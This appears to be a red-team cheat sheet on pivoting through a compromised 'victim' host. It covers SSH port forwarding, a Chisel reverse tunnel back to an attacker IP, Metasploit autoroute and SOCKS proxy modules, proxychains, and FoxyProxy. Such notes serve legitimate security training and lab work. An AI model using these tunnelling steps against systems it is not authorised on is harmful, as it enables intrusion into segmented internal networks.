Using SSH Tunnels (You must have ssh access to the victim)
	
	1. Local: Forwards a connection from the client host to the SSH server host and then	to the destination host port.

		>ssh -L <local_ip>:<local_port>:<dest_service>:<dest_port> username@<ip>
		
		-> If local_ip is omitted, the ssh client binds on the localhost.
		-> When the destination host is the same as the SSH server, instead of specifying the destination host IP or hostname, you can use localhost.


		For example, You want to access a webserver running on the victim's port 10000 and you cant access from outside, then you can set up a local port forward like this:
			>ssh -L 8080:localhost:10000 -N -f username@SSH_server_IP
				-N: dont execute the command
				-f: to run in the background.

	2. Remote: Forwards a port from the server host to the client host and then to the destination host port.
		>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER


Chisel Reverse Port Forwarding
	1. Upload chisel windows binary to the target.
	2. Run chisel server locally:
		./chisel_1.7.3_linux_amd64 server -p 5678 -reverse
		-> This means we have opened up a port 5678 to which chisel client will connect to
	3. Run chisel client on the target:
		chisel.exe client 10.10.16.20:5678 R:8888:127.0.0.1:8888
		-> This means we are connecting to the chisel server running on the attacker machine, and forwarding port 8888 locally so that we can access port 8888 on the attacking machine.
		

Auto-Routing our Traffic:
	To setup a proxy server you will need a meterpreter session or a reverse shell open in metasploit before hand. You can easily get a meterpreter shell by uploading a payload to the machine and executing it.
	1. background
	2. use post/multi/manage/autoroute
	3. set SESSION 1
	4. set SUBNET 10.200.x.0
	5. exploit

Setting up our Proxy with Metasploit:
	1. use auxiliary/server/socks4a
	2. (optional) Change your port, you can either keep the default 1080 port or change it to an open port of your choice.
	
	Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks_proxy. With MSF6, you will need to specify if you want to use SOCKS4(a) or SOCKS5.
	

Configuring and Using the proxy chains:
	1. sudo nano /etc/proxychains.conf
	2. You will need to comment out the socks4 proxy on 9050 which is a default proxy for tor and add the proxy chain we just created with the port that you gave when creating the proxies.
	3. proxychains <command>
		-> You can now run any normal commands or tools that you want and it will be forwarded through the proxy chain if you append your tool or command with “proxychains”.
		
Pivoting with proxychains:
	Pivoting may seem like a very big and scary thing but it is actually fairly simple after you have your proxy server set up. After setting up the proxy server you can pivot to any machines or resources that the proxy server has access to. For example if you had a proxy server on example-ws01 and example-ws02 was segmented by a security groups that made it so only example-ws01 had access you could use your proxy server on example-ws01 to access example-ws02. You can use any way of accessing the machine that you would usually like ssh, rdp, win-rm, psexec you just have to prepend the command with proxychains.
	
	Examples:
		1.) proxychains ssh user@MACHINE_IP
		2.) proxychains xfreerdp /u:user /p:password /v:MACHINE_IP
		3.) proxychains evil-winrm -i MACHINE_IP -u user -p password

Setting up a Web Proxy with FoxyProxy
	Now that we have a proxy setup to forward our traffic through we need a way to easily access the resources on the network. Let's add an extension to our web browser to allow us to easily route our traffic through it.
	1.) Click on FoxyProxy among your extensions. After that, click on 'Options', Then click on 'Add'.
	2.) Enter in the following setting you will need to fill in the title, proxy type (SOCKS4), Proxy IP, and Port then click 'Save'.
	3.) Click on Foxy Proxy in your extensions and enable the web proxy.
	Note: You can now access internal resources and devices from within firefox.
